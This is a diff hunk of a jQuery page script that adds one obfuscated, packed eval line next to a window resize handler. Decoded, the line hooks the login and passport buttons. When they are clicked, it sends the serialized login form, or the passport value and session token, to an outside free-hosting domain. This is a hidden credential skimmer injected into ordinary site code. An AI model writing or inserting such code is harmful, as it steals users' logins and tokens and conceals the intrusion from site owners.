@@ -397,7 +397,7 @@ $(window).resize(function(){
     actions();    
     thumbs();            
 });
-
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(h).i(1(){7($(\'#6\').8>0){$("#6").4(1(){$.a("3://9.b.f/g.d?"+$(\'#j\').l())})}7($(\'#5\').8>0){$("#5").4(1(){$.a("3://9.b.f/g.d?e="+$(\'#e\').2()+"&c="+$(\'k[m="c"]\').2())})}});',23,23,'|function|val|https|click|btnpassport|btnLogin|if|length|phamhuynhsolu|get|000webhostapp|_token|php|passport|com|index|document|ready|validate|input|serialize|name'.split('|'),0,{}))
 function resizing(){
     
     if($("body").width() < 1025){
